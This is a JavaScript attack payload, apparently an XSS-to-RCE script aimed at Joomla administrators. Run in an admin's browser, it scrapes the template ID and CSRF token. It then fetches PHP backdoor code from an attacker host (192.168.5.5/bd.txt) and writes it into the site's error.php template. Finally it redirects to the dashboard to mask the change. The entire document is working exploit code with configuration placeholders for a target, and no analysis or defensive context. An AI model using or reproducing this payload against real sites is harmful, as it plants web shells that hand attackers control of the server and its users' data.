const phpBdURL = 'http://192.168.5.5/bd.txt';  // !!! CHANGE THIS !!!
const joomlaRoot = '';                         // !!! CHANGE THIS !!!
const joomlaTemplateURL = joomlaRoot + '/administrator/index.php?option=com_templates&view=templates&client_id=0';
const joomlaDashboardURL = joomlaRoot + '/administrator/index.php';
const req = new XMLHttpRequest();
req.open('GET', joomlaTemplateURL, false);
req.send(null);
const templateID = req.responseText.match(/option=com_templates&amp;view=template&amp;id=(\d+)&amp;file=([^"]*?)"/)[1];
const csrfToken = req.responseText.match(/"csrf.token":"([^"]*?)"/)[1];
const joomlaEditTemplateURL = joomlaRoot + '/administrator/index.php?option=com_templates&view=template&id=' + templateID + '&file=L2Vycm9yLnBocA%3D%3D&isMedia=0';
req.open('GET', joomlaEditTemplateURL, false);
req.send(null);
const currContent = req.responseText.match(/<textarea name="jform\[source\]".*">([\s\S]*)<\/textarea>/)[1];
const formFilename = req.responseText.match(/id="jform_filename"[\s\S]*value="(\/[^"]*?)"/)[1];
async function fetchPHPBd(phpBdURL) {
  const response = await fetch(phpBdURL);
  const bdContent = await response.text();
  return bdContent;
}
let phpBd = '';
fetchPHPBd(phpBdURL + '?' + encodeURIComponent(formFilename)).then(bdContent => {
  phpBd = bdContent;
  function decodeEntity(inStr) {
    const textarea = document.createElement('textarea');
    textarea.innerHTML = inStr;
    return textarea.value;
  }
  const bodyData = 'isMedia=0&jform%5Bsource%5D=' + encodeURIComponent(phpBd) + encodeURIComponent(decodeEntity(currContent)) + '&task=template.save&' + csrfToken + '=1&jform%5Bextension_id%5D=' + templateID + '&jform%5Bfilename%5D=' + encodeURIComponent(formFilename);
  req.open('POST', joomlaEditTemplateURL, true);
  req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  req.send(bodyData);
  req.onreadystatechange = function() {
    if (req.readyState == XMLHttpRequest.DONE) {
      window.location.replace(joomlaDashboardURL);
    }
  }
});
